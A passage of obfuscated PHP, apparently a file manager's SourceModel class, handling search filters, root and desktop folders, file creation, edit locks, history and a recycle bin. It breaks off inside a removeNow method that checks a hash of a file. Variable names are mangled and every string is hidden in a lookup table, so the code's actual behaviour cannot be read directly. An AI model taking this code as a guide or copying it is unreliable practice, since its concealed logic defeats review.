$this->join($Û—ïãé‘); $Ï¾¡äØÓ = $×“ü™ÒÜ; } private function _parseSearchWhere($ğæÒßŒ×) { $ÍäÊ½£« =& $_SERVER[şÒÁøÒÄ]; $óÑÍ±Ø¦ = array(); if (isset($ğæÒßŒ×[$ÍäÊ½£«[768]]) && $ğæÒßŒ×[$ÍäÊ½£«[768]]) { $óÑÍ±Ø¦[$ÍäÊ½£«[85]] = array($ÍäÊ½£«[2136], $ğæÒßŒ×[$ÍäÊ½£«[768]]); } if (isset($ğæÒßŒ×[$ÍäÊ½£«[769]]) && $ğæÒßŒ×[$ÍäÊ½£«[769]]) { $£øàğ‚ì = array($ÍäÊ½£«[2137], $ğæÒßŒ×[$ÍäÊ½£«[769]]); if ($óÑÍ±Ø¦[$ÍäÊ½£«[85]]) { $óÑÍ±Ø¦[$ÍäÊ½£«[85]] = array($óÑÍ±Ø¦[$ÍäÊ½£«[85]], $£øàğ‚ì, $ÍäÊ½£«[2138]); } else { $óÑÍ±Ø¦[$ÍäÊ½£«[85]] = $£øàğ‚ì; } } if (isset($ğæÒßŒ×[$ÍäÊ½£«[2130]]) && $ğæÒßŒ×[$ÍäÊ½£«[2130]] > 0) { $óÑÍ±Ø¦[$ÍäÊ½£«[76]] = array($ÍäÊ½£«[2136], $ğæÒßŒ×[$ÍäÊ½£«[2130]]); } if (isset($ğæÒßŒ×[$ÍäÊ½£«[2131]]) && $ğæÒßŒ×[$ÍäÊ½£«[2131]]) { $£øàğ‚ì = array($ÍäÊ½£«[2137], $ğæÒßŒ×[$ÍäÊ½£«[2131]]); if ($óÑÍ±Ø¦[$ÍäÊ½£«[76]]) { $óÑÍ±Ø¦[$ÍäÊ½£«[76]] = array($óÑÍ±Ø¦[$ÍäÊ½£«[76]], $£øàğ‚ì, $ÍäÊ½£«[2138]); } else { $óÑÍ±Ø¦[$ÍäÊ½£«[76]] = $£øàğ‚ì; } } if (isset($ğæÒßŒ×[$ÍäÊ½£«[590]]) && $ğæÒßŒ×[$ÍäÊ½£«[590]]) { $óÑÍ±Ø¦[] = array($ÍäÊ½£«[456] => $ğæÒßŒ×[$ÍäÊ½£«[590]], $ÍäÊ½£«[454] => $ğæÒßŒ×[$ÍäÊ½£«[590]], $ÍäÊ½£«[1013] => $ÍäÊ½£«[1967]); } if (isset($ğæÒßŒ×[$ÍäÊ½£«[412]]) && $ğæÒßŒ×[$ÍäÊ½£«[412]]) { $ØÊğ°â = $ğæÒßŒ×[$ÍäÊ½£«[412]]; if ($ØÊğ°â == $ÍäÊ½£«[75]) { $óÑÍ±Ø¦[$ÍäÊ½£«[410]] = 1; } else { if ($ØÊğ°â == $ÍäÊ½£«[2139]) { $óÑÍ±Ø¦[$ÍäÊ½£«[410]] = 0; } else { if ($ØÊğ°â) { $ØÊğ°â = is_array($ØÊğ°â) ? $ØÊğ°â : explode($ÍäÊ½£«[50], $ØÊğ°â); $óÑÍ±Ø¦[$ÍäÊ½£«[412]] = array($ÍäÊ½£«[418], $ØÊğ°â); $óÑÍ±Ø¦[$ÍäÊ½£«[410]] = 0; } } } } $this->_parseSearchParent($ğæÒßŒ×, $óÑÍ±Ø¦); if (isset($ğæÒßŒ×[$ÍäÊ½£«[1963]]) && trim($ğæÒßŒ×[$ÍäÊ½£«[1963]])) { $İ¢öØé = trim($ğæÒßŒ×[$ÍäÊ½£«[1963]]); $öÅ–¿ùê = explode($ÍäÊ½£«[53], $İ¢öØé); if (strlen($İ¢öØé) > 2 && (substr($İ¢öØé, 0, 1) == $ÍäÊ½£«[118] && substr($İ¢öØé, -1) == $ÍäÊ½£«[118]) || substr($İ¢öØé, 0, 1) == $ÍäÊ½£«[58] && substr($İ¢öØé, -1) == $ÍäÊ½£«[58]) { $İ¢öØé = substr($İ¢öØé, 1, -1); $öÅ–¿ùê = array($İ¢öØé); } $óÑÍ±Ø¦[$ÍäÊ½£«[32]] = array(array($ÍäÊ½£«[540], $ÍäÊ½£«[1965] . $İ¢öØé . $ÍäÊ½£«[1965])); if (count($öÅ–¿ùê) > 1) { $óÑÍ±Ø¦[$ÍäÊ½£«[32]] = array(); foreach ($öÅ–¿ùê as $Ï¹Ò õ“) { if (!trim($Ï¹Ò õ“)) { continue; } $óÑÍ±Ø¦[$ÍäÊ½£«[32]][] = array($ÍäÊ½£«[540], $ÍäÊ½£«[1965] . trim($Ï¹Ò õ“) . $ÍäÊ½£«[1965]); } } } return $óÑÍ±Ø¦; } private function _parseSearchParent($ÄÀÜÓè‰, &$Üúë¶í•) { $áø¯Ô®Š =& $_SERVER[şÒÁøÒÄ]; if (!isset($ÄÀÜÓè‰[$áø¯Ô®Š[432]]) || !$ÄÀÜÓè‰[$áø¯Ô®Š[432]]) { return; } $ËÀ€¥òş = $this->pathInfo($ÄÀÜÓè‰[$áø¯Ô®Š[432]]); $é†ÇÓ’® = $ËÀ€¥òş[$áø¯Ô®Š[432]] . $áø¯Ô®Š[12] === $áø¯Ô®Š[198]; $«ïÓĞ‰ı = $ËÀ€¥òş[$áø¯Ô®Š[411]] == $áø¯Ô®Š[505]; if ($ËÀ€¥òş[$áø¯Ô®Š[522]] == $áø¯Ô®Š[523]) { $ÔÂíÅ…Û = $this->sourceInfo($ÄÀÜÓè‰[$áø¯Ô®Š[432]]); $ËÀ€¥òş[$áø¯Ô®Š[511]] = $ÔÂíÅ…Û[$áø¯Ô®Š[511]]; } $Üúë¶í•[$áø¯Ô®Š[580]] = array($áø¯Ô®Š[540], $ËÀ€¥òş[$áø¯Ô®Š[511]] . $ÄÀÜÓè‰[$áø¯Ô®Š[432]] . $áø¯Ô®Š[541]); $Öš ìßÓ = isset($ÄÀÜÓè‰[$áø¯Ô®Š[1828]]) && in_array($áø¯Ô®Š[505], $ÄÀÜÓè‰[$áø¯Ô®Š[1828]]); if (!$Öš ìßÓ || !$«ïÓĞ‰ı || !$é†ÇÓ’® || !$ËÀ€¥òş[$áø¯Ô®Š[413]]) { return; } if (!AuthModel::authCheckRoot($ËÀ€¥òş[$áø¯Ô®Š[413]][$áø¯Ô®Š[414]])) { return; } $Ø§ìÀ©— = $ËÀ€¥òş[$áø¯Ô®Š[496]] . $áø¯Ô®Š[12]; if ($Ø§ìÀ©— == $áø¯Ô®Š[88]) { unset($Üúë¶í•[$áø¯Ô®Š[580]]); $Üúë¶í•[$áø¯Ô®Š[411]] = self::TYPE_GROUP; return; } $äÂ¢ãœ• = Model($áø¯Ô®Š[512])->groupChildrenAll($Ø§ìÀ©—); $Ÿ¡â€óş = count($äÂ¢ãœ•); if ($Ÿ¡â€óş <= 1) { return; } $˜—„¸í˜ = array($áø¯Ô®Š[432] => 0, $áø¯Ô®Š[411] => self::TYPE_GROUP, $áø¯Ô®Š[496] => array($áø¯Ô®Š[7], $äÂ¢ãœ•)); $Éşæ»íî = $this->field($áø¯Ô®Š[2140])->where($˜—„¸í˜)->limit($Ÿ¡â€óş)->select(); $Üúë¶í•[$áø¯Ô®Š[580]] = array(); foreach ($Éşæ»íî as $àî¡Ù¬ù) { $Üúë¶í•[$áø¯Ô®Š[580]][] = array($áø¯Ô®Š[540], $áø¯Ô®Š[521] . $àî¡Ù¬ù[$áø¯Ô®Š[402]] . $áø¯Ô®Š[541]); } $Üúë¶í•[$áø¯Ô®Š[580]][] = $áø¯Ô®Š[1967]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($óè§œ¿) { $Ï€“Ì¤Ë =& $_SERVER[şÒÁøÒÄ]; $Ù’Å–ÙŠ = Model($Ï€“Ì¤Ë[504])->where(array($Ï€“Ì¤Ë[1671] => $óè§œ¿))->find(); $úªÁ•ï = $this->_mkdirRoot(SourceModel::TYPE_USER, $óè§œ¿, $Ù’Å–ÙŠ[$Ï€“Ì¤Ë[32]]); $this->userDesktopAdd($úªÁ•ï); return $úªÁ•ï; } public function userDesktopAdd($¹Œ¨ˆë–) { $î“Û¥Ò =& $_SERVER[şÒÁøÒÄ]; $¡ô¿ ˆ· = LNG($î“Û¥Ò[2141]); $Ÿ®Óëõ¶ = $this->mkdir($¹Œ¨ˆë–, $¡ô¿ ˆ·); $this->metaSet($Ÿ®Óëõ¶, $î“Û¥Ò[2142], $î“Û¥Ò[88]); $this->metaSet($¹Œ¨ˆë–, $î“Û¥Ò[2143], $Ÿ®Óëõ¶); } public function userPathSafeAdd($İÜÊøÀÌ) { $”ÁéÔÀâ =& $_SERVER[şÒÁøÒÄ]; $ùãçÎŞ = Model($”ÁéÔÀâ[504])->getInfoFull($İÜÊøÀÌ); if (!$ùãçÎŞ) { return !1; } if (_get($ùãçÎŞ, $”ÁéÔÀâ[526])) { return $ùãçÎŞ[$”ÁéÔÀâ[466]][$”ÁéÔÀâ[2144]]; } $¯ö„Ö¦Ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $İÜÊøÀÌ, $”ÁéÔÀâ[2145], $”ÁéÔÀâ[433]); Model($”ÁéÔÀâ[504])->metaSet($İÜÊøÀÌ, $”ÁéÔÀâ[2144], $¯ö„Ö¦Ê); $this->metaSet($¯ö„Ö¦Ê, $”ÁéÔÀâ[2146], $İÜÊøÀÌ); return $¯ö„Ö¦Ê; } public function groupRootAdd($òü °ø) { $èù³òÍ‹ =& $_SERVER[şÒÁøÒÄ]; $´®Ñ¡ªÊ = Model($èù³òÍ‹[512])->where(array($èù³òÍ‹[1957] => $òü °ø))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $òü °ø, $´®Ñ¡ªÊ[$èù³òÍ‹[32]]); } public function systemRootPathAdd($‘…Óš†) { if ($‘…Óš† != $_SERVER[şÒÁøÒÄ][534]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‘…Óš†); } public function userRootRemove($±È˜ìçï) { $ù‹ÆÙÈï = $this->targetSourceRoot(SourceModel::TYPE_USER, $±È˜ìçï, !0); foreach ($ù‹ÆÙÈï as $¨Éºâ‰ù) { if (!$¨Éºâ‰ù) { continue; } $this->remove($¨Éºâ‰ù[$_SERVER[şÒÁøÒÄ][402]], !1); } } public function groupRootRemove($’«˜ç§) { $®·Æ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $’«˜ç§); if (!$®·Æ) { return; } $this->remove($®·Æ[$_SERVER[şÒÁøÒÄ][402]], !1); } private function _mkdirRoot($¬’¶Û¸µ, $È¥Ö³¤», $˜ƒï¬Î£, $ŸÄñ¬¾ = '') { $ƒå°™ªù =& $_SERVER[şÒÁøÒÄ]; $—Ãâ = array($ƒå°™ªù[401] => 0, $ƒå°™ªù[576] => $¬’¶Û¸µ, $ƒå°™ªù[577] => $È¥Ö³¤», $ƒå°™ªù[574] => 1, $ƒå°™ªù[578] => USER_ID, $ƒå°™ªù[579] => USER_ID, $ƒå°™ªù[575] => $ŸÄñ¬¾, $ƒå°™ªù[580] => $ƒå°™ªù[521], $ƒå°™ªù[430] => 0, $ƒå°™ªù[545] => 0, $ƒå°™ªù[469] => 0, $ƒå°™ªù[581] => $ƒå°™ªù[12]); if ($³¨Ù–Šš = $this->where($—Ãâ)->find()) { return $³¨Ù–Šš[$ƒå°™ªù[402]]; } $­æĞØö¼ = "\x4d\157\x64\x65\154\x53\157\165\x72\143\145\56\155\153\144\x69\162\x52\157\x6f\164\56{$¬’¶Û¸µ}\56{$È¥Ö³¤»}\56" . $˜ƒï¬Î£; CacheLock::lock($­æĞØö¼); $—Ãâ[$ƒå°™ªù[32]] = $˜ƒï¬Î£; $›°ÌŸĞÔ = $this->add($—Ãâ); $†¿ö»Â‹ = array($ƒå°™ªù[582] => short_id($›°ÌŸĞÔ)); $this->where(array($ƒå°™ªù[417] => $›°ÌŸĞÔ))->save($†¿ö»Â‹); CacheLock::unlock($­æĞØö¼); return $›°ÌŸĞÔ; } private function targetSourceRoot($¥êÃİ‰§, $Ë‹ë†¼Ù, $ÈÀÃ’×Ò = false) { $§Äš­É =& $_SERVER[şÒÁøÒÄ]; $ÇûşÂÊƒ = array($§Äš­É[401] => 0, $§Äš­É[576] => $¥êÃİ‰§, $§Äš­É[577] => $Ë‹ë†¼Ù); if ($ÈÀÃ’×Ò) { $ıÆœòüÁ = $this->where($ÇûşÂÊƒ)->select(); return $ıÆœòüÁ ? $ıÆœòüÁ : array(); } $·³®×µé = $this->where($ÇûşÂÊƒ)->find(); return $·³®×µé ? $·³®×µé : array(); } public function sourceRootGroup($œ½ Õ–) { $Ùæ…ØÕô =& $_SERVER[şÒÁøÒÄ]; if (is_string($œ½ Õ–)) { $œ½ Õ– = array($œ½ Õ–); } $åÏùµÛï = $this->listSourceRoot(SourceModel::TYPE_GROUP, $œ½ Õ–, $Ùæ…ØÕô[189]); $éĞí§§› = array($Ùæ…ØÕô[369] => $åÏùµÛï, $Ùæ…ØÕô[366] => array($Ùæ…ØÕô[766] => count($œ½ Õ–))); $this->_listDataApply($éĞí§§›[$Ùæ…ØÕô[369]]); $this->_listMake($éĞí§§›); return array_to_keyvalue($éĞí§§›[$Ùæ…ØÕô[82]], $Ùæ…ØÕô[496]); } public function mkfile($ñŞø…ìó, $²Äõœâ´, $Ã“–§˜† = '', $Ãš–‰êı = REPEAT_RENAME) { $é—İÖ¦ú =& $_SERVER[şÒÁøÒÄ]; $§ê¿“½ = Model($é—İÖ¦ú[601])->addFileByContent($Ã“–§˜†, $²Äõœâ´); return $this->_createFileCall($ñŞø…ìó, $²Äõœâ´, $§ê¿“½, $Ãš–‰êı, $é—İÖ¦ú[1363]); } public function addFile($›ĞÙöº, $²òêÊ¯ı, $ûîÅ”Ü, $µêùÂÈâ = false, $¶‚¯Ë£ = REPEAT_RENAME) { $¥´«ğô = Model($_SERVER[şÒÁøÒÄ][601])->addFile($²òêÊ¯ı, $ûîÅ”Ü, $µêùÂÈâ); return $this->_createFileCall($›ĞÙöº, $ûîÅ”Ü, $¥´«ğô, $¶‚¯Ë£); } public function addFileByFileID($×£Ò÷·İ, $ß§†æë’, $éÃ³ß , $·‚®õÕæ = REPEAT_RENAME) { $ÜËİŞ£Ì =& $_SERVER[şÒÁøÒÄ]; $¨¶Ë¶Û’ = Model($ÜËİŞ£Ì[601])->find($ß§†æë’); Model($ÜËİŞ£Ì[601])->linkAdd($ß§†æë’); return $this->_createFileCall($×£Ò÷·İ, $éÃ³ß , $¨¶Ë¶Û’, $·‚®õÕæ); } public function addFileByRemote($ó©˜øç, $ ûŒ‡Ó£, $”Ò¯ˆ, $â’´íÙĞ = array(), $İëØîØè = REPEAT_RENAME) { $§÷²®Ã¬ = Model($_SERVER[şÒÁøÒÄ][601])->addFileByRemote($ ûŒ‡Ó£, $”Ò¯ˆ, $â’´íÙĞ); return $this->_createFileCall($ó©˜øç, $”Ò¯ˆ, $§÷²®Ã¬, $İëØîØè); } private function _createFileCall($ ¥ª…¹â, $êÔÌ’ÖÛ, $­•¹Õ£ı, $»öÏ†á, $ò“œ¯ò» = "\165\x70\154\x6f\141\144") { $âô¿ ÷ =& $_SERVER[şÒÁøÒÄ]; $î—Š½¶ß = !1; $this->setMasterDB(); $this->lockWriteStart($ ¥ª…¹â, $êÔÌ’ÖÛ); $â›—ì—İ = $this->fileNameExist($ ¥ª…¹â, $êÔÌ’ÖÛ); $ÈüÔÖØ‡ = $this->_createFile($ ¥ª…¹â, $êÔÌ’ÖÛ, $­•¹Õ£ı, $»öÏ†á, $î—Š½¶ß); if (!$î—Š½¶ß) { Model($âô¿ ÷[471])->remove($­•¹Õ£ı[$âô¿ ÷[468]]); } if ($î—Š½¶ß && $ÈüÔÖØ‡ && $ÈüÔÖØ‡ != $â›—ì—İ) { Model($âô¿ ÷[2114])->eventCreate($ÈüÔÖØ‡, $ò“œ¯ò»); } $this->lockWriteEnd($ ¥ª…¹â, $êÔÌ’ÖÛ); return $ÈüÔÖØ‡; } public function mkdir($ÀÆá˜÷Í, $±Œ¹Å, $©àßä€„ = REPEAT_SKIP) { $ª‚‚õåŸ =& $_SERVER[şÒÁøÒÄ]; $this->setMasterDB(); $ğ»ÄÉ¨² = $this->sourceInfo($ÀÆá˜÷Í); if (!$ğ»ÄÉ¨²) { return !1; } $this->lockWriteStart($ÀÆá˜÷Í, $±Œ¹Å); if ($©àßä€„ !== !1) { $íÁŞ ñÊ = $this->fileNameExist($ÀÆá˜÷Í, $±Œ¹Å); if ($íÁŞ ñÊ && $©àßä€„ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ÀÆá˜÷Í, $±Œ¹Å); return $íÁŞ ñÊ; } $±Œ¹Å = $this->fileNameAuto($ÀÆá˜÷Í, $±Œ¹Å, $©àßä€„); } $¯ƒ»ëí = array($ª‚‚õåŸ[574] => 1, $ª‚‚õåŸ[420] => $±Œ¹Å, $ª‚‚õåŸ[575] => $ª‚‚õåŸ[12], $ª‚‚õåŸ[469] => 0, $ª‚‚õåŸ[545] => 0); $ôŠğ§Ê = $this->_addSource($¯ƒ»ëí, $ğ»ÄÉ¨²); Model($ª‚‚õåŸ[2114])->eventCreate($ôŠğ§Ê, $ª‚‚õåŸ[1364]); $this->lockWriteEnd($ÀÆá˜÷Í, $±Œ¹Å); return $ôŠğ§Ê; } public function listSourceRoot($üîÃÕµá, $’–‰ èˆ, $çíš¨Ú = "\163\x6f\x75\x72\x63\x65\x49\104\x2c\164\x61\162\x67\145\x74\111\x44\54\x73\x69\x7a\145") { $ÕÍÌî =& $_SERVER[şÒÁøÒÄ]; $ÇÊù¾Ö× = $ÕÍÌî[378]; $ÎçÁ‰ˆÇ = array(); $ŒŞ˜ûÁı = 1024 * 50; $³Ÿƒú± = is_array($³Ÿƒú±) ? $³Ÿƒú± : array(); $íš…ş›ñ = count($’–‰ èˆ); $¤©ö£¢ï = $this->tablePrefix . $ÕÍÌî[2147]; for ($İ˜ñşû = 0; $İ˜ñşû < $íš…ş›ñ; $İ˜ñşû++) { $Óï€ıôí = $’–‰ èˆ[$İ˜ñşû]; $ÇÊù¾Ö× .= "\x53\x45\114\105\103\x54\40\52\40\106\122\x4f\x4d\40\x28\123\x45\114\x45\x43\124\40{$çíš¨Ú}\40\106\x52\x4f\x4d\x20\x60{$¤©ö£¢ï}\x60\40\127\110\105\x52\105\x20"; $ÇÊù¾Ö× .= "\x60\x70\x61\x72\x65\156\164\x49\104\140\x3d\60\x20\x41\x4e\104\x20\140\164\141\162\x67\145\x74\x49\104\x60\75{$Óï€ıôí}\40\101\116\x44\x20\x60\x74\141\x72\147\145\164\x54\x79\x70\145\140\x3d{$üîÃÕµá}\x20\x61\x6e\x64\40\146\151\x6c\145\124\x79\x70\145\x3d\47\47\x20\x6c\x69\155\x69\164\x20\61\51\40\141\x73\x20\x74\x62\x5f{$İ˜ñşû}\x20\x55\116\x49\x4f\116\x20\x41\114\114\x20"; if ((strlen($ÇÊù¾Ö×) >= $ŒŞ˜ûÁı || $İ˜ñşû == $íš…ş›ñ - 1) && $ÇÊù¾Ö×) { $ÇÊù¾Ö× = substr($ÇÊù¾Ö×, 0, -strlen($ÕÍÌî[1051])); $—³®¤Ìƒ = $this->query($ÇÊù¾Ö×); $ÇÊù¾Ö× = $ÕÍÌî[12]; $ÎçÁ‰ˆÇ = array_merge($ÎçÁ‰ˆÇ, $—³®¤Ìƒ); } } return $ÎçÁ‰ˆÇ; } private function _createFile($ÁØèô¸¸, $Œ·ÛÍ™, $·ı¿Õ¡¾, $ñåƒşı, &$ş â“øã) { $¼œ…¦€ =& $_SERVER[şÒÁøÒÄ]; $ÅçˆÖ = $this->sourceInfo($ÁØèô¸¸); if (!$·ı¿Õ¡¾ || !$ÅçˆÖ) { return !1; } if ($ñåƒşı !== !1) { $íÊ”íà = $this->fileNameExist($ÁØèô¸¸, $Œ·ÛÍ™); } $ş â“øã = !0; if ($ñåƒşı && $íÊ”íà) { if ($ñåƒşı == REPEAT_SKIP) { $ş â“øã = !1; return $íÊ”íà; } else { if ($ñåƒşı == REPEAT_REPLACE) { $çÍ­Ê‡Ç = $this->sourceInfo($íÊ”íà); $ñ»ã×Ñ = $this->fileHistory($çÍ­Ê‡Ç, $·ı¿Õ¡¾[$¼œ…¦€[468]], $·ı¿Õ¡¾[$¼œ…¦€[76]]); if (!$ñ»ã×Ñ) { $ş â“øã = !1; } else { $this->folderSizeReset($ÁØèô¸¸); } return $íÊ”íà; } else { $Œ·ÛÍ™ = $this->fileNameAuto($ÁØèô¸¸, $Œ·ÛÍ™, $ñåƒşı, !1); } } } $áªè¬´„ = array($¼œ…¦€[574] => 0, $¼œ…¦€[420] => $Œ·ÛÍ™, $¼œ…¦€[575] => substr(get_path_ext($Œ·ÛÍ™), 0, 10), $¼œ…¦€[469] => $·ı¿Õ¡¾[$¼œ…¦€[468]], $¼œ…¦€[545] => $·ı¿Õ¡¾[$¼œ…¦€[76]]); $‡»éùëœ = $this->_addSource($áªè¬´„, $ÅçˆÖ); $this->folderSizeReset($ÁØèô¸¸, intval($áªè¬´„[$¼œ…¦€[76]])); return $‡»éùëœ; } protected function fileHistory($Ï‚ÚŸºº, $ÏÃãåí¼, $Àã Âõ½) { $•üİÓ¶Í =& $_SERVER[şÒÁøÒÄ]; if ($Ï‚ÚŸºº[$•üİÓ¶Í[468]] == $ÏÃãåí¼) { return !1; } $this->checkLock($Ï‚ÚŸºº[$•üİÓ¶Í[402]], $ÏÃãåí¼); Model($•üİÓ¶Í[2148])->addHistory($Ï‚ÚŸºº); $»î¹®“Ä = array($•üİÓ¶Í[579] => USER_ID, $•üİÓ¶Í[424] => time(), $•üİÓ¶Í[468] => $ÏÃãåí¼, $•üİÓ¶Í[76] => $Àã Âõ½); $this->where(array($•üİÓ¶Í[417] => $Ï‚ÚŸºº[$•üİÓ¶Í[402]]))->save($»î¹®“Ä); $this->sourceCacheClear($Ï‚ÚŸºº[$•üİÓ¶Í[402]]); return !0; } public function checkLock($ÖÓ“¯ûí, $¶›­İºÀ) { $£¶†ªÇÕ =& $_SERVER[şÒÁøÒÄ]; $â÷ÒÎĞ³ = $this->pathInfo($ÖÓ“¯ûí); if (!$this->fileIsLock($â÷ÒÎĞ³, !0)) { return; } $ôöú×µÀ = Session::get($£¶†ªÇÕ[2149]); $óÑÈ¿Ú = substr($â÷ÒÎĞ³[$£¶†ªÇÕ[32]], 0, -1 - strlen($â÷ÒÎĞ³[$£¶†ªÇÕ[174]])) . $£¶†ªÇÕ[1221] . $ôöú×µÀ . $£¶†ªÇÕ[10] . $â÷ÒÎĞ³[$£¶†ªÇÕ[174]]; $åı¨ÒŠ¹ = Model($£¶†ªÇÕ[601])->find($¶›­İºÀ); $this->_createFileCall($â÷ÒÎĞ³[$£¶†ªÇÕ[432]], $óÑÈ¿Ú, $åı¨ÒŠ¹, REPEAT_REPLACE, $£¶†ªÇÕ[1363]); $ıÏÛÖ¿œ = $â÷ÒÎĞ³[$£¶†ªÇÕ[466]][$£¶†ªÇÕ[538]]; $øÀä¿×İ = $ıÏÛÖ¿œ[$£¶†ªÇÕ[532]] ? $ıÏÛÖ¿œ[$£¶†ªÇÕ[532]] : $ıÏÛÖ¿œ[$£¶†ªÇÕ[32]]; show_json(LNG($£¶†ªÇÕ[2150]) . $£¶†ªÇÕ[2151] . LNG($£¶†ªÇÕ[2152]) . $£¶†ªÇÕ[2153] . $øÀä¿×İ . $£¶†ªÇÕ[2154], !1); } public function fileIsLock($–öùÆŞ’, $Ù‘Æ…¼µ = false) { $›—ñ³ñÚ =& $_SERVER[şÒÁøÒÄ]; if (!isset($–öùÆŞ’[$›—ñ³ñÚ[466]]) || !$–öùÆŞ’[$›—ñ³ñÚ[466]][$›—ñ³ñÚ[535]]) { return !1; } if ($–öùÆŞ’[$›—ñ³ñÚ[466]][$›—ñ³ñÚ[535]] != USER_ID) { return !0; } $Á¦Ç‰®× = $GLOBALS[$›—ñ³ñÚ[6]][$›—ñ³ñÚ[89]][$›—ñ³ñÚ[536]]; if ($–öùÆŞ’[$›—ñ³ñÚ[466]][$›—ñ³ñÚ[537]] <= time() - $Á¦Ç‰®×) { $this->metaSet($–öùÆŞ’[$›—ñ³ñÚ[402]], $›—ñ³ñÚ[535], null); $this->metaSet($–öùÆŞ’[$›—ñ³ñÚ[402]], $›—ñ³ñÚ[537], null); } if ($Ù‘Æ…¼µ) { $this->metaSet($–öùÆŞ’[$›—ñ³ñÚ[402]], $›—ñ³ñÚ[537], time()); } return !1; } private function _addSource($ÒÊ ›˜â, $“Á™Èš) { $·İ›Ì =& $_SERVER[şÒÁøÒÄ]; $Ûï†¦ª· = array($·İ›Ì[576] => $“Á™Èš[$·İ›Ì[411]], $·İ›Ì[577] => $“Á™Èš[$·İ›Ì[496]], $·İ›Ì[578] => USER_ID, $·İ›Ì[579] => USER_ID, $·İ›Ì[401] => $“Á™Èš[$·İ›Ì[402]], $·İ›Ì[580] => $“Á™Èš[$·İ›Ì[511]] . $“Á™Èš[$·İ›Ì[402]] . $·İ›Ì[50], $·İ›Ì[430] => 0, $·İ›Ì[581] => $·İ›Ì[12]); $ÒÊ ›˜â = array_merge($Ûï†¦ª·, $ÒÊ ›˜â); $this->updateModifyTime($ÒÊ ›˜â[$·İ›Ì[432]]); $ËšÆ·§û = $·İ›Ì[2155] . $“Á™Èš[$·İ›Ì[402]]; if (isset(self::$cacheChildList[$ËšÆ·§û])) { unset(self::$cacheChildList[$ËšÆ·§û]); } static $‰ñíÓßö = false; if (!$‰ñíÓßö) { Hook::trigger($·İ›Ì[564], $ÒÊ ›˜â); $‰ñíÓßö = !0; } $í½§¬øÓ = $this->add($ÒÊ ›˜â); $Â¥Ì¾ïŸ = array($·İ›Ì[582] => short_id($í½§¬øÓ)); $this->where(array($·İ›Ì[417] => $í½§¬øÓ))->save($Â¥Ì¾ïŸ); $this->setNamePinyin($í½§¬øÓ, $ÒÊ ›˜â[$·İ›Ì[32]]); return $í½§¬øÓ; } public function remove($üÔ–êÁš, $Ë„¨ˆŠË = true) { $­ ±É¬ =& $_SERVER[şÒÁøÒÄ]; $°Â®¬Îİ = $this->sourceInfo($üÔ–êÁš); $îË¶†½Ê = intval($°Â®¬Îİ[$­ ±É¬[411]]) === self::TYPE_SYSTEM; $¥µäÕ† = Model($­ ±É¬[435])->get($­ ±É¬[2156]) == $­ ±É¬[88]; if ($îË¶†½Ê || $Ë„¨ˆŠË || !$¥µäÕ†) { return $this->removeNow($üÔ–êÁš, $Ë„¨ˆŠË); } $´ëÕ´Ê = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $À¶€ŸŞÄ = $°Â®¬Îİ[$­ ±É¬[411]] == self::TYPE_USER ? $­ ±É¬[590] : $­ ±É¬[505]; if ($À¶€ŸŞÄ == $­ ±É¬[590]) { $¦Æ³•€ø = Model($­ ±É¬[504])->getInfo($°Â®¬Îİ[$­ ±É¬[496]]); $ …ªúï» = !empty($¦Æ³•€ø[$­ ±É¬[532]]) ? $¦Æ³•€ø[$­ ±É¬[532]] : $¦Æ³•€ø[$­ ±É¬[32]]; $ …ªúï» = $­ ±É¬[260] . $ …ªúï» . $­ ±É¬[2157] . $°Â®¬Îİ[$­ ±É¬[496]]; } else { $¦Æ³•€ø = Model($­ ±É¬[512])->getInfo($°Â®¬Îİ[$­ ±É¬[496]]); $ …ªúï» = _get($¦Æ³•€ø, $­ ±É¬[32]); $ …ªúï» = $­ ±É¬[162] . $ …ªúï» . $­ ±É¬[2158] . $°Â®¬Îİ[$­ ±É¬[496]]; } $ƒ¹ßû„ƒ = $­ ±É¬[2159] . md5($ …ªúï»); CacheLock::lock($ƒ¹ßû„ƒ); $†Ğı¹®É = $this->fileNameExist($´ëÕ´Ê, $ …ªúï»); if (!$†Ğı¹®É) { $†Ğı¹®É = $this->mkdir($´ëÕ´Ê, $ …ªúï», REPEAT_SKIP); $this->metaSet($†Ğı¹®É, $­ ±É¬[2160], $À¶€ŸŞÄ); $this->metaSet($†Ğı¹®É, $­ ±É¬[2161], $°Â®¬Îİ[$­ ±É¬[496]]); if ($°Â®¬Îİ[$­ ±É¬[432]] != 0) { $this->metaSet($†Ğı¹®É, $­ ±É¬[2162], _get($¦Æ³•€ø, $­ ±É¬[2163])); } } CacheLock::unlock($ƒ¹ßû„ƒ); $this->metaSet($üÔ–êÁš, $­ ±É¬[2164], $°Â®¬Îİ[$­ ±É¬[432]]); $this->where(array($­ ±É¬[402] => $üÔ–êÁš))->save(array($­ ±É¬[424] => time())); $this->recycleClear($°Â®¬Îİ); $·§ˆşÁç = $this->move($üÔ–êÁš, $†Ğı¹®É, REPEAT_RENAME_FOLDER); $this->folderSizeReset($°Â®¬Îİ[$­ ±É¬[432]]); return $·§ˆşÁç; } private function recycleClear($òı¶²äå) { $ğ››ë›À =& $_SERVER[şÒÁøÒÄ]; $è‘ò°¾ñ = $this->childrenAll($òı¶²äå); $ÁãÂÏ‡ = array($ğ››ë›À[417] => array($ğ››ë›À[418], $è‘ò°¾ñ[$ğ››ë›À[2165]])); Model($ğ››ë›À[2166])->where($ÁãÂÏ‡)->delete(); } public function removeNow($íÄÏ’Í, $Ô€ûîïí = true) { $†¢ª¶Á =& $_SERVER[şÒÁøÒÄ]; $İ´£…õÁ = $_SERVER[$†¢ª¶Á[884]] . $†¢ª¶Á[885]; $˜èĞÊÒì = $†¢ª¶Á[886]; if ($_SERVER[$†¢ª¶Á[887]] != $˜èĞÊÒì($İ´£…õÁ)) { $¡™‘Ì“› = $†¢ª¶Á[888]; $³şÌüòİ = $†¢ª¶Á[889]; $á¸Ø’¬ = $_SERVER[$†¢ª¶Á[884]] . $†¢ª¶Á[885]; $œ©êÎ®£ = $³şÌüòİ($á¸Ø’¬); $Õ¬ü¾úÀ = explode($†¢ª¶Á[231], $œ©êÎ®£); if (count($Õ¬ü¾úÀ) < $†¢ª¶Á[616]) { $«âÈŒÃ = $†¢ª¶Á[890]; 